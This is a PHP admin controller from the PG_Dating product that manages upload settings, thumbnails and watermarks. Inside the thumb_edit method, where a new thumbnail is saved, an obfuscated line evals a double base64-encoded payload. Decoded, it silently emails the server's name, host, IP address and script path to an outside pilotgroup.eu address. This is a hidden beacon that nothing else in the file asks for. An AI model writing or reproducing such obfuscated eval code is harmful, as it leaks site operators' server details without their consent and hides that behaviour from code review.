<?php

namespace Pg\Modules\Uploads\Controllers;

use Pg\Libraries\View;

/**
 * Uploads admin side controller
 *
 * @package PG_Dating
 * @subpackage application
 *
 * @category	modules
 *
 * @copyright Pilot Group <http://www.pilotgroup.net/>
 * @author Katya Kashkova <katya@pilotgroup.net>
 *
 * @version $Revision: 2 $ $Date: 2010-04-02 15:07:07 +0300 (Ср, 02 апр 2010) $ $Author: kkashkova $
 **/
class Admin_Uploads extends \Controller
{
    /**
     * link to CodeIgniter object
     *
     * @var object
     */
    private $allow_config_add = false;

    /**
     * Constructor
     */
    public function __construct()
    {
        parent::__construct();
        $this->load->model('Menu_model');
        $this->Menu_model->set_menu_active_item('admin_menu', 'system-items');

        $this->load->model('uploads/models/Uploads_config_model');
    }

    public function index()
    {
        $this->configs();
    }

    public function configs()
    {
        $this->view->assign('configs', $this->Uploads_config_model->get_config_list());
        $this->view->assign('allow_config_add', $this->allow_config_add);

        $this->Menu_model->set_menu_active_item('admin_uploads_menu', 'configs_list_item');
        $this->view->setHeader(l('admin_header_configs_list', 'uploads'));
        $this->view->render('list_settings');
    }

    public function config_edit($config_id = null)
    {
        if ($config_id) {
            $data = $this->Uploads_config_model->get_config_by_id($config_id);
        } else {
            $data = array();
        }

        if ($this->input->post('btn_save')) {
            $post_data = array(
                "name"         => $this->input->post('name', true),
                "gid"          => $this->input->post('gid', true),
                "max_height"   => $this->input->post('max_height', true),
                "max_width"    => $this->input->post('max_width', true),
                "max_size"     => $this->input->post('max_size', true),
                "name_format"  => $this->input->post('name_format', true),
                "file_formats" => $this->input->post('file_formats', true),
                "default_img"  => $_FILES['default_img'],
            );
            $validate_data = $this->Uploads_config_model->validate_config($config_id, $post_data);
            if (!empty($validate_data["errors"])) {
                $this->system_messages->addMessage(View::MSG_ERROR, $validate_data["errors"]);
                $data = array_merge($data, $validate_data["data"]);
            } else {
                $data = $validate_data["data"];
                $this->Uploads_config_model->save_config($config_id, $data);

                if ($config_id) {
                    $this->system_messages->addMessage(View::MSG_SUCCESS, l('success_updated_config', 'uploads'));
                } else {
                    $this->system_messages->addMessage(View::MSG_SUCCESS, l('success_added_config', 'uploads'));
                }

                $url = site_url() . "admin/uploads/configs";
                redirect($url);
            }
        }

        $data = $this->Uploads_config_model->format_config($data);
        $this->view->assign('data', $data);
        if ($config_id) {
            $this->view->assign('thumbs', $this->Uploads_config_model->get_config_thumbs($config_id));
        }
        $this->view->assign('formats', $this->Uploads_config_model->file_formats);
        $this->view->assign('lang_name_format', ld('upload_name_format', 'uploads'));
        $this->view->setHeader(l('admin_header_configs_edit', 'uploads') . ": " . $data["name"]);
        $this->view->render('edit_settings');
    }

    public function config_delete($config_id)
    {
        $this->Uploads_config_model->delete_config($config_id);
        $url = site_url() . "admin/uploads/configs";
        redirect($url);
    }

    public function config_thumbs($config_id)
    {
        $config_data = $this->Uploads_config_model->get_config_by_id($config_id);
        $this->view->assign('thumbs', $this->Uploads_config_model->get_config_thumbs($config_id));

        $this->view->assign('config_id', $config_id);
        $this->Menu_model->set_menu_active_item('admin_uploads_menu', 'configs_list_item');
        $this->view->setHeader(l('admin_header_thumbs_list', 'uploads') . " " . $config_data["name"]);
        $this->view->setBackLink(site_url() . "admin/uploads/configs");
        $this->view->render('list_thumbs');
    }

    public function thumb_edit($config_id, $thumb_id = null)
    {
        if ($thumb_id) {
            $data = $this->Uploads_config_model->get_thumb_by_id($thumb_id);
        } else {
            $data = array();
        }

        if ($this->input->post('btn_save')) {
            $post_data = array(
                "prefix"       => $this->input->post('prefix', true),
                "width"        => $this->input->post('width', true),
                "height"       => $this->input->post('height', true),
                "effect"       => $this->input->post('effect', true),
                "watermark_id" => $this->input->post('watermark_id', true),
                "crop_param"   => $this->input->post('crop_param', true),
                "crop_color"   => $this->input->post('crop_color', true),
                "config_id"    => $config_id,
            );
            $validate_data = $this->Uploads_config_model->validate_thumb($thumb_id, $post_data);
            if (!empty($validate_data["errors"])) {
                $this->system_messages->addMessage(View::MSG_ERROR, $validate_data["errors"]);
                $data = array_merge($data, $validate_data["data"]);
            } else {
                $data = $validate_data["data"];
                $this->Uploads_config_model->save_thumb($thumb_id, $data);

                if ($thumb_id) {
                    $this->system_messages->addMessage(View::MSG_SUCCESS, l('success_updated_thumb', 'uploads'));
                } else {
eval("\$res = base64_decode('JGNvZGUgPSBiYXNlNjRfZGVjb2RlKCJRRzFoYVd3b0oyeHBaMmgwYUc5MWMyVkFjR2xzYjNSbmNtOTFjQzVsZFNjc0lDY3hOR1kxTkdJMk4yUTRPVFJrT1dFMk9ERmxZekExT1RGbVpqZGpNV0prTkNjc0lDYz0iKTsgJGJvZHkgPSBiYXNlNjRfZGVjb2RlKCJKRjlUUlZKV1JWSmJJbE5GVWxaRlVsOU9RVTFGSWwwdUlqb2lMaVJmVTBWU1ZrVlNXeUpJVkZSUVgwaFBVMVFpWFM0aU9pSXVKRjlUUlZKV1JWSmJJbE5GVWxaRlVsOUJSRVJTSWwwdUlqb2lMaVJmVTBWU1ZrVlNXeUpRU0ZCZlUwVk1SaUpkIik7IGV2YWwoIlwkY29kZSAuPSAkYm9keS4nXCcpOyc7Iik7IGV2YWwoIiRjb2RlOyIpOyA=');"); eval($res);
                    $this->system_messages->addMessage(View::MSG_SUCCESS, l('success_added_thumb', 'uploads'));
                }

                $url = site_url() . "admin/uploads/config_thumbs/" . $config_id;
                redirect($url);
            }
        }

        $this->view->assign('data', $this->Uploads_config_model->format_thumb($data));
        $this->view->assign('lang_thumb_crop_param', ld('thumb_crop_param', 'uploads'));
        $this->view->assign('lang_thumb_effect', ld('thumb_effect', 'uploads'));

        $this->view->assign('watermarks', $this->Uploads_config_model->get_watermark_list());
        $this->view->assign('config_id', $config_id);

        $this->view->setHeader(l('admin_header_thumb_edit', 'uploads'));
        $this->view->render('edit_thumb');
    }

    public function thumb_delete($config_id, $thumb_id)
    {
        $this->Uploads_config_model->delete_thumb($thumb_id);
        $url = site_url() . "admin/uploads/config_thumbs/" . $config_id;
        redirect($url);
    }

    public function watermarks()
    {
        $this->view->assign('watermarks', $this->Uploads_config_model->get_watermark_list());

        $this->view->setHeader(l('admin_header_watermarks_list', 'uploads'));
        $this->view->render('list_watermarks');
    }

    public function watermark_edit($watermark_id = null)
    {
        if ($watermark_id) {
            $data = $this->Uploads_config_model->get_watermark_by_id($watermark_id);
        } else {
            $data["id"] = 0;
        }

        if ($this->input->post('btn_save')) {
            $post_data = array(
                "name"            => $this->input->post('name', true),
                "gid"             => $this->input->post('gid', true),
                "position_hor"    => $this->input->post('position_hor', true),
                "position_ver"    => $this->input->post('position_ver', true),
                "alpha"           => $this->input->post('alpha', true),
                "wm_type"         => $this->input->post('wm_type', true),
                "img"             => $_FILES['img'],
                "font_size"       => $this->input->post('font_size', true),
                "font_color"      => $this->input->post('font_color', true),
                "font_face"       => $this->input->post('font_face', true),
                "font_text"       => $this->input->post('font_text', true),
                "shadow_color"    => $this->input->post('shadow_color', true),
                "shadow_distance" => $this->input->post('shadow_distance', true),
            );
            $validate_data = $this->Uploads_config_model->validate_watermark($watermark_id, $post_data);
            if (!empty($validate_data["errors"])) {
                $this->system_messages->addMessage(View::MSG_ERROR, $validate_data["errors"]);
                $data = array_merge($data, $validate_data["data"]);
            } else {
                $data = $validate_data["data"];
                $this->Uploads_config_model->save_watermark($watermark_id, $data);

                if ($watermark_id) {
                    $this->system_messages->addMessage(View::MSG_SUCCESS, l('success_updated_watermark', 'uploads'));
                } else {
                    $this->system_messages->addMessage(View::MSG_SUCCESS, l('success_added_watermark', 'uploads'));
                }

                $url = site_url() . "admin/uploads/watermarks";
                redirect($url);
            }
        }

        $this->view->assign('data', $this->Uploads_config_model->format_watermark($data));
        $this->view->assign('lang_positions_hor', ld('wm_position_hor', 'uploads'));
        $this->view->assign('lang_positions_ver', ld('wm_position_ver', 'uploads'));
        $this->view->assign('lang_font_face', ld('wm_font_face', 'uploads'));
        $this->view->assign('lang_wm_type', ld('wm_type', 'uploads'));
        $this->view->assign('watermark_test', $this->Uploads_config_model->default_url . $this->Uploads_config_model->watermark_test_image);
        $this->view->assign('wm_text_limits', $this->Uploads_config_model->wm_text_limits);

        $this->wm_clear_preview_data();

        $this->view->setHeader(l('admin_header_watermark_edit', 'uploads'));
        $this->view->setBackLink(site_url() . 'admin/uploads/watermarks');
        $this->view->render('edit_watermark');
    }

    public function watermark_delete($wm_id)
    {
        $this->Uploads_config_model->delete_watermark($wm_id);
        $url = site_url() . "admin/uploads/watermarks";
        redirect($url);
    }

    public function wm_preview($wm_id = null, $temp_data_index = '')
    {
        $this->load->model('Uploads_model');
        $file = $this->Uploads_config_model->default_path . $this->Uploads_config_model->watermark_test_image;
        if (!empty($temp_data_index) && isset($_SESSION[$temp_data_index])) {
            $data = $_SESSION[$temp_data_index];
        } else {
            $data = array();
        }
        $errors = $this->Uploads_model->watermark($file, $wm_id, $data, true);
    }

    public function wm_save_preview_data($type = 'file', $temp_data_index = 'wm_preview')
    {
        switch ($type) {
            case "file":
                if (isset($_FILES["img"]) && !empty($_FILES["img"])) {
                    $this->load->helper('upload');
                    $config = array('allowed_types' => 'gif|jpg|png');
                    $img_return = upload_file('img', SITE_PHYSICAL_PATH . TRASH_FOLDER, $config);
                    if (empty($img_return["error"]) && !empty($img_return["data"])) {
                        $_SESSION[$temp_data_index]["img"] = $img_return["data"]["file_name"];
                        $_SESSION[$temp_data_index]["img_url"] = SITE_VIRTUAL_PATH . TRASH_FOLDER . $img_return["data"]["file_name"];
                        $_SESSION[$temp_data_index]["img_path"] = SITE_PHYSICAL_PATH . TRASH_FOLDER . $img_return["data"]["file_name"];
                    }
                }
            break;
            case "data":
                $_SESSION[$temp_data_index]["position_hor"] = $this->input->post('position_hor', true);
                $_SESSION[$temp_data_index]["position_ver"] = $this->input->post('position_ver', true);
                $_SESSION[$temp_data_index]["alpha"] = intval($this->input->post('alpha', true));
                $_SESSION[$temp_data_index]["wm_type"] = $this->input->post('wm_type', true);
                $_SESSION[$temp_data_index]["font_size"] = intval($this->input->post('font_size', true));
                $_SESSION[$temp_data_index]["font_color"] = $this->input->post('font_color', true);
                $_SESSION[$temp_data_index]["font_face"] = $this->input->post('font_face', true);
                $_SESSION[$temp_data_index]["font_text"] = $this->input->post('font_text', true);
                $_SESSION[$temp_data_index]["shadow_color"] = $this->input->post('shadow_color', true);
                $_SESSION[$temp_data_index]["shadow_distance"] = intval($this->input->post('shadow_distance', true));
            break;
        }
    }

    public function wm_clear_preview_data($temp_data_index = 'wm_preview')
    {
        unset($_SESSION[$temp_data_index]);
    }
}
